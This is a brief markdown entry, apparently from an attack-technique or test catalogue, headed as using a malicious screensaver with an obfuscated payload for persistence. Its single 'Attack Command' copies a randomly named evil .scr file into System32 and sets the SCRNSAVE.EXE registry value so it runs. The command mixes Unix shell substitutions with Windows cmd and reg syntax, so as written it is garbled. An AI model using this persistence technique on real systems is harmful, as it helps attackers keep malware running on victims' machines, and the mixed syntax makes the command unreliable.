...
# Using malicious screensaver with obfuscated payload for persistence.
...
## Attack Command
```
copy $(echo evil$(cat /dev/urandom | tr -dc 'a-z0-9' | head -c 8).scr) %windir%\System32 && reg add "HKCU\Control Panel\Desktop" /v SCRNSAVE.EXE /t REG_SZ /d "%windir%\System32\$(echo evil$(cat /dev/urandom | tr -dc 'a-z0-9' | head -c 8).scr) /p $(cat /dev/urandom | tr -dc 'a-zA-Z0-9' | head -c 12)"
```
